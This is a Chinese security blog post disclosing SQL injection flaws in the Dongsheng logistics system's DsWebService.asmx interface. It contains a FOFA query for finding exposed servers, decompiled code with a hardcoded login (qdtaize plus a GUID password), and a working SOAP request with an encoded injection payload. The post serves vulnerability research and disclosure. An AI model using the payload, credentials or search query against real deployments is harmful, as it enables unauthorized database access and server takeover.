---
title: "东胜物流软件 DsWebService.asmx 多个SQL注入漏洞"
source: https://mrxn.net/jswz/dongsheng-DsWebService-sqli.html
asset_dir: assets/东胜物流软件-dswebservice.asmx-多个sql注入漏洞
---

# 东胜物流软件 DsWebService.asmx 多个SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/28 13:19
* 957浏览
* [0评论](#comment)
* 41分钟阅读

深入探索

数据库

Database

database


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

东胜物流软件是青岛东胜伟业软件有限公司一款集订单管理、仓库管理、运输管理等多种功能于一体的物流管理软件。东胜物流信息管理系统 DsWebService.asmx 接口GetSeaiBsData、GetSeaeBsDataList、GetSeaeBsData和GetSeaiBsDataList、LoadCustomMainfastStatus、GetSeaiData等方法存在[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

物流软件安全

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

深入探索

授权

漏洞修复方案

Windows安全工具

直接看 GetSeaiBsDataList 相关实现逻辑

```
public string GetSeaiBsDataList(
  string LoginName,
  string LoginPass,
  string Mobile,
  string Mblno,
  int start,
  int limit)
{
  SeaiManifest seaiBsDataList = DsWebServiceDAL.GetSeaiBsDataList(LoginName, LoginPass, Mobile, Mblno, start, limit);
```

跟进GetSeaiBsDataList方法

SQL注入防护

```
public static SeaiManifest GetSeaiBsDataList(
  string LoginName,
  string LoginPass,
  string Mobile,
  string Mblno,
  int start,
  int limit)
{
  SeaiManifest seaiBsDataList = new SeaiManifest();
  if (string.op_Inequality(LoginName, "qdtaize") || string.op_Inequality(LoginPass, "EBBE3242-D49E-4398-BBFE-0133CA655EB5"))
  {
    seaiBsDataList.ERROMSG = "账号密码不正确";
    return seaiBsDataList;
  }
  T_ALL_DA tAllDa = new T_ALL_DA();
  string str = "";
  string strSql1 = tAllDa.GetStrSQL("GID", $"SELECT top 1 GID FROM user_action Where ACTIONID='4B19971E-FA7F-4528-89F3-4F740CE3D8D5' AND USERID IN (SELECT USERID FROM user_baseinfo WHERE MOBILE='{Mobile}' ) ");
```

存在硬编码账户密码 qdtaize:EBBE3242-D49E-4398-BBFE-0133CA655EB5

代码安全审计

然后参数Mobile被直接拼接在MOBILE=后，无任何过滤或校验，导致[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)，朴实无华！

同时另外一个参数Mblno也存在同样的问题

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-001-41c6332ef2d0.webp)](https://image.mrxn.net/f692582f9908461da11283c65ab4fd34.webp)

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-002-9b618325df19.webp)](https://image.mrxn.net/7719d11948eb4f409921a70ade1b1104.webp)

GetSeaiBsData存在同样的问题

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-003-0ac6897fcc6d.webp)](https://image.mrxn.net/f045e47e8a73498c8328ad1a33401cfe.webp)

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-004-212c2f526f74.webp)](https://image.mrxn.net/0d2a7eafe98e41acb072a322f14c28f8.webp)

GetSeaeBsDataList 同样如此！

漏洞预警服务

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-005-23509a040e61.webp)](https://image.mrxn.net/1b42e5e8115f44f49171faa40acf2e09.webp)

GetSeaeBsData亦如此！

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-006-6a46ee1d02c5.webp)](https://image.mrxn.net/89bc1daa96f14a4eba3f51a28a7238dd.webp)

GetSeaiData

```
public string GetSeaiData(string LoginName, string LoginPass, string Mblno, string Pono)
{
  if (string.op_Inequality(LoginName, "qdtaize") || string.op_Inequality(LoginPass, "EBBE3242-D49E-4398-BBFE-0133CA655EB5"))
    return "账号密码不正确";
  if (string.op_Equality(Mblno, "") && string.op_Equality(Pono, ""))
    return "提单号和PO号不能为空";
  if (string.op_Inequality(Mblno, ""))
  {
    MsOpSeaiHead msOpSeaiHead = new MsOpSeaiHead();
    DSWeb.MvcShipping.Models.MsOpSeai.MsOpSeai data = DSWeb.MvcShipping.DAL.MsOpSeaiDAL.MsOpSeaiDAL.GetData($"MBLNO='{Mblno}'");
```

存在硬编码账户密码 qdtaize:EBBE3242-D49E-4398-BBFE-0133CA655EB5

网络安全

然后参数LoginName被直接拼接在MBLNO=后，无任何过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，朴实无华！

LoadCustomMainfastStatus

```
public string LoadCustomMainfastStatus(string Mblno)
{
  return string.op_Equality(Mblno, "") ? "" : DsWebServiceDAL.LoadBillStatus(Mblno);
}
public static string LoadBillStatus(string Mblno)
{
  StringBuilder stringBuilder = new StringBuilder();
  stringBuilder.Append("SELECT CH_ID,MBLNO,CNTRNO,SEALNO,DATESTR,VOYNO,[STATUS],[FILENAME],ISPOSTED,CREATETIME");
  stringBuilder.Append(" FROM op_custom_status ");
  stringBuilder.Append($" Where MBLNO='{Mblno}' and (ISPOSTED=0 or ISPOSTED is null) ");
  stringBuilder.Append(" order by CREATETIME ");
  DataSet dataSet = new DataSet();
  Database database = DatabaseFactory.CreateDatabase();
  ManifestStatus manifestStatus = new ManifestStatus();
```

参数`Mblno`也是被直接拼接在SQL语句中执行造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /Webservice/DsWebService.asmx HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetSeaiBsDataList"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
   <soap:Header/>
   <soap:Body>
      <dsw:GetSeaiBsDataList>
         <!--Optional:-->
         <dsw:LoginName>qdtaize</dsw:LoginName>
         <!--Optional:-->
         <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
         <!--Optional:-->
         <dsw:Mobile>&#x31;&#x27;&#x29;&#x6f;&#x72;&#x20;&#x31;&#x3c;&#x75;&#x73;&#x65;&#x72;&#x2d;&#x2d;</dsw:Mobile>
         <!--Optional:-->
         <dsw:Mblno>1</dsw:Mblno>
         <dsw:start>1</dsw:start>
         <dsw:limit>1</dsw:limit>
      </dsw:GetSeaiBsDataList>
   </soap:Body>
</soap:Envelope>
```

[![东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](images/img-007-ff3d1312f730.webp)](https://image.mrxn.net/f374e7275ede4753ae4ab6a081d366de.webp)

通过报错注入在响应里回显数据库版本信息。

漏洞预警服务

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[东胜物流软件 DsWebService.asmx 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-DsWebService-sqli.html)  
文章链接：<https://mrxn.net/jswz/dongsheng-DsWebService-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-DsWebService-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKZUlEQVR4AeycAXYbNwxE/XP/O7cZQUNCJJZaO7ZWbZgXeIDBAKSIpSU7ff318fHxz5/aP/c/7nMPb1Bxt8TwxbqMlphzfIQrXZUzl9G9M1f51hkrzVc4DeR33f77LifQBvJ70h+fsdULAD4gzD0hYuhY9bBeWOXPcNDXgPCrOq0hq3IVJ60Nnve19hnmtdpAMrn9605gGgjE5KHG1Vb9JKw0OQd9DddC5yD8Kpf7jL71QufkyxwLIfrLt8HMqU4GkQPadxPXVQhdD7Nf1UwDqUSbe90J7IG87qxPrfStA4G4ltXKuvKjZR1E7ahRbJ18m7kKIXoBUxqYPnBkkftnhKjJup/yv3UgP7XJv6nvjwwkP13VYUI8cVlnv9Kbg6gDTLWnHfobrXtlbAVPHOChJ9AqvtKvFZ90fmQgHycX37L5BPZA5jO5lJkGkq9l5Z/ZLdCu/UoPXQezP9bm/UDoswaCg2PMPXKt/Zy37xzMfZ2r0PVHWNVMA6lEm3vdCbSBwDx9OOZWW8xPBESPSp91zmcOHmshYuhv4K4Tula+reKcg+hnjRCCsyaj8rbMjz5EDziHub4NJJPbv+4E9kCuO/ty5V++gn+C7uwe0K+qc9A565wTmoOuEy+D4OTbIDjXCSE4azIqL4PQAC0NTB9CYOZaQeGo93fYviHF4V5JLQcC8ZRUG4TIAVV64vLTA9yeyCyCmXM+19p3DqIOMNV+NS5tI++OuNHuqQcYNYqzQLEsc/aB2+uDGa0RwpxfDkRFb2R/xVamgUCfmk8AZk5Phw0ib735jM4dYdaOvmsg1oH+sTdrrcsIvQbIqfYUn+2Ri4Fbfebs5372nYOog/4anBNOAxG57boT2AO57uzLlX9BXCFnfcWOEEIPHV1rhOOcNSNCr4FH39q8JwiNcxkhclB/W8ja0fcaMPeAmXM99ByE79wRQui8pnDfkKPTuohvPxhCTCvvA4KDjpriaK6B0DkWwsyJH23smeNRq9h5iP7Qb4NzQoi8amQQMaBwMuD2Zq1aG8zcWGhtxqwx/4zbNySf0Bv4eyBvMIS8hTYQXymI6wn1twAXw1rnfkbXHSH0fhC+tRAxzOj+QuszipeZkz8a9L7WQeesh85B+JUeHnPSQHDuJYTglLe1gZj46/DNXvD0sffZ/iCmqgnbxhoIDXQcNYphzrunUBqZfJl8m2KZ47MI85q5Vj1lmVv5EP1UM9qq7ii3b8jRyVzE74FcdPBHyy5/DjkqEg9xVQGFDzZeXcUPgnsgfrR76gGA288GD2QRQOigo2Vex/ERQtRWefeoEKIOqErbPwlUSeD2+oCPfUM+3utPe1P31PP2ICaXOfvWC83BrIeZU43MdUIIHcyo/JFB11uj3jaIvHMVWius8hA9YMaVPucgajNX+fuGVKdyIbcHcuHhV0u3N/UqueIgriB0tB5mzrlnqG8btmda5a0VKpbB8frS2aDrIHzn1Md2hrNG6Lqv4L4hXzm15zVfVrQ39aqDpi3LOcWj5bz8Ma8Y4gmEjtLapJFBnZdOeZvi0ZzLOGqqOOsh1s86mLmclw+hARRO5jWA9hHXXBbvG5JP4w38NhCIyXlqQggO1ihtNuj61WuEroPws949M2cfQg8dq5y5Cqv+5p4h9HWBh/auBdptgPCdE0JwubgNJJPbv+4E9kCuO/ty5eljL8Q1gvU/UOnK2crOdxKi3z28gesqvAnuX2CuvaeWvxta9YXoCefRa0KvqdYwB6FznNG9hObl2/